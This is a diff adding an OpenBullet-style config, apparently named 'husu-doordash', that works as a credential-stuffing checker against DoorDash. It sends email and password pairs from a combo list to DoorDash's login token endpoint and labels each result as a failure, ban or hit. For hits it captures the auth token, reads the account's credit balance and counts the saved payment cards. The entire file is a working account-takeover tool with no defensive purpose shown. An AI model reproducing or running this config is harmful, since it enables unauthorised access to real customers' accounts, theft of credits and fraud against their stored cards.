@@ -1,0 +1,92 @@
+[SETTINGS]
+{
+  "Name": "husu-doordash",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-11-24T18:03:23.1379323+01:00",
+  "AdditionalInfo": "",
+  "Author": "husu",
+  "Version": "1.4.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://identity.doordash.com/api/v1/auth/token" 
+  CONTENT "{\"credentials\":{\"email\":\"<USER>\",\"password\":\"<PASS>\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Authorization: FtrOvqTNyAkAAAAAAAAAADpTSUJ1bUKhAAAAAAAAAACeT6l00rBlswAAAAAAAAAA" 
+  HEADER "Content-Type: application/json; charset=UTF-8" 
+  HEADER "Host: identity.doordash.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "User-Agent: okhttp/3.14.2" 
+  HEADER "X-NewRelic-ID: XAUEWF5SGwEJUFhUDwcA" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 68" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "No factors supplied" 
+    KEY "Unable to login with provided credentials" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" Contains "401" 
+  KEYCHAIN Success OR 
+    KEY "token\":\"" 
+
+PARSE "<SOURCE>" LR "refresh_token\":\"" "\"" -> VAR "rtoken" 
+
+PARSE "<SOURCE>" LR "token\":\"" "\",\"" -> VAR "token"  
+
+REQUEST GET "https://api.doordash.com/v2/consumers/me/?expand=account_credits_monetary_fields&expand=default_payment_card&expand=district&expand=district.submarket&expand=phone_number_components&expand=referree_amount_monetary_fields&expand=referrer_amount_monetary_fields&fields=account_credits_monetary_fields&fields=account_credits_monetary_fields.currency&fields=account_credits_monetary_fields.decimal_places&fields=account_credits_monetary_fields.display_string&fields=account_credits_monetary_fields.unit_amount&fields=default_country_shortname&fields=default_address&fields=default_payment_card&fields=district&fields=district.id&fields=district.submarket&fields=district.submarket.id&fields=district.submarket.name&fields=email&fields=first_name&fields=has_accepted_latest_terms_of_service&fields=has_usable_password&fields=id&fields=is_guest&fields=last_name&fields=num_orders_submitted&fields=phone_number_components&fields=phone_number_components.country_code&fields=phone_number_components.country_shortname&fields=phone_number_components.national_number&fields=phone_number&fields=receive_marketing_push_notifications&fields=receive_push_notifications&fields=receive_text_notifications&fields=referree_amount_monetary_fields&fields=referree_amount_monetary_fields.currency&fields=referree_amount_monetary_fields.decimal_places&fields=referree_amount_monetary_fields.display_string&fields=referree_amount_monetary_fields.unit_amount&fields=referrer_amount_monetary_fields&fields=referrer_amount_monetary_fields.currency&fields=referrer_amount_monetary_fields.decimal_places&fields=referrer_amount_monetary_fields.display_string&fields=referrer_amount_monetary_fields.unit_amount&fields=social_account_providers" 
+  
+  HEADER "Authorization: JWT <token>" 
+
+PARSE "<SOURCE>" REGEX "\\\"account_credits_monetary_fields\\\":{\\\"currency\\\":\\\"USD\\\",\\\"display_string\\\":\\\"([^\\\"]*)" "[1]" -> CAP "Credit" 
+
+REQUEST GET "https://api.doordash.com/v2/consumers/me/payment_cards/" 
+  
+  HEADER "Authorization: JWT <token>" 
+
+PARSE "<SOURCE>" LR "" "" -> VAR "CreditCard" 
+
+FUNCTION CountOccurrences "\"type\"" "<CreditCard>" -> CAP "CreditCards" 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "[]"
